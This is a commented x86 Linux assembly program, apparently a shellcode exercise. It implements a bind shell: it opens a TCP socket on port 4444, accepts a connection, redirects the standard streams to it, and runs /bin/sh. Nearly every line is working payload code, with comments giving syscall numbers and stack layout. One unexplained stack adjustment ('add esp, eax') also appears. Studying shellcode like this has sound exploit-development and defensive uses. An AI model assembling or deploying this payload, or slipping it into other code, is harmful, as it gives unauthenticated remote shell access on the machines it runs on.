global _start
 
section .text
 
_start:
; Creating the socket.
;
; int socket(int domain, int type, int protocol);
;
; socket() is defined as #define __NR_socket 359 on /usr/include/i386-linux-gnu/asm/unistd_32.h
; AF_INET is defined as 2 in /usr/include/i386-linux-gnu/bits/socket.h
; SOCK_STREAM is defined as 1 in /usr/include/i386-linux-gnu/bits/socket_type.h

xor eax, eax
mov ebx, eax
mov ecx, eax
mov edx, eax
 
mov ax, 0x167 ; 359 in decimal
add esp, eax
mov bl, 0x2
mov cl, 0x1
 
int 0x80 ; sfd = socket(AF_INET, SOCK_STREAM, 0);
mov ebx, eax ; storing the socket descriptor into EBX for next syscall
 
;push eax ; save socket descriptor into the stack
 
; Binding the socket to 0.0.0.0 address at port 4444
;
; int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;
;
; bind() is defined as #define __NR_bind 361 on /usr/include/i386-linux-gnu/asm/unistd_32.h
 
xor eax, eax
mov ax, 0x169 ; 361 in decimal
xor ecx, ecx
push ecx       ; pushing 32 bit INADDR_ANY
push word 0x5c11 ; pushing PORT 4444 in network byte order
push word 0x2   ; pushing AF_INET as sin_family
 
mov ecx, esp ; now ECX points to the my_addr data structure
mov dl, 0x10 ; sizeof(my_addr) = 16 bytes
int 0x80 ; bind(sfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
 
; Listening on opened socket bound to port 4444
;
; int listen(int sockfd, int backlog);
;
; listen() is defined as #define __NR_listen 363 in /usr/include/i386-linux-gnu/asm/unistd_32.h
xor ecx, ecx
xor eax, eax
mov ax, 0x16b ; 363 in decimal
int 0x80 ; listen(sfd, 0);
 
; Accepting incoming connection on listening socket
;
; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
;
; accept() is not defined as syscall in /usr/include/i386-linux-gnu/asm/unistd_32.h.
; Instead accept4() is defined as #define __NR_accept4 364.
;
; From the man page, accept4() has the followint prototype:
; int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);
;
; The last integer, as from the man page, if set to 0 makes the
; accept4() call to behave as the same as the accept()
xor eax, eax
mov ax, 0x16c ; 364 in decimal
 
push ecx ; ECX is 0, pushing on the stack
 
mov esi, ecx
mov ecx, esp ; ECX now points to a zero bytes region from the stack.
mov edx, esp
 
int 0x80 ; cfd = accept4(sfd, NULL, NULL, 0);
 
mov ebx, eax ; Saving socket descript resulting from accept4 into EBX
 
; Duplicating descriptor 0, 1, 2 to the socket opened by client
;
; int dup2(int oldfd, int newfd);
;
; dup2 is defined as #define __NR_dup2 63 in /usr/include/i386-linux-gnu/asm/unistd_32.h
 
xor ecx, ecx
mov cl,  2
xor eax, eax
 
dup2:
mov al, 0x3F ; 63 in decimal
int 0x80 ; duplicating file descriptors in backwards order; from 2 to 0
dec ecx
jns dup2
 
; Executing shell
;
; int execve(const char *filename, char *const argv[], char *const envp[]);
; execve() is defined as #define __NR_execve 11 on
;/usr/include/i386-linux-gnu/asm/unistd_32.h
 
xor eax, eax
push eax ; The NULL byte
push 0x68732f2f ; "sh//". The second '\' is used to align our command into the stack
push 0x6e69622f ; "nib/"
mov ebx, esp ; EBX now points to "/bin//sh"
xor ecx, ecx
xor edx, edx
mov al, 0xB ; 11 in decimal
int 0x80
